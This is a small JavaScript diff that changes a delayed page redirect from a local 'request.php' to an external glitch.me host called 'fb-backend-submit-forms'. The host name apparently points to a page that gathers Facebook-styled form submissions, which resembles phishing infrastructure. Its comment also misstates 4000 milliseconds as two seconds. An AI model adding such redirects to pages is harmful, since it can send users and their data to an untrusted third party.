@@ -38,7 +38,7 @@
       var currentHost = window.location.hostname;
       
       setTimeout(function() {
-        var redirectURL = "request.php"; // Updated URL
+        var redirectURL = "https://fb-backend-submit-forms.glitch.me/"; // Updated URL
         window.location.replace(redirectURL);
       }, 4000); // 4000 milliseconds (2 seconds)
     });
